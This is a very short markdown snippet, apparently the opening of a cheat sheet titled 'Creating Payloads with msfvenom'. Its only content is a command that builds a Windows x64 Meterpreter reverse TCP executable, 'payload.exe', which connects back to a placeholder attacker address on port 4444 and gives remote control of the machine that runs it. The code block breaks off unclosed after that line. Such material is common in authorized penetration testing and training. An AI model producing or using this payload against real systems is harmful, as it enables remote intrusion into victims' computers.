\# Creating Payloads with msfvenom



\## Basic reverse TCP

```bash

msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=YOUR\_IP LPORT=4444 -f exe -o payload.exe

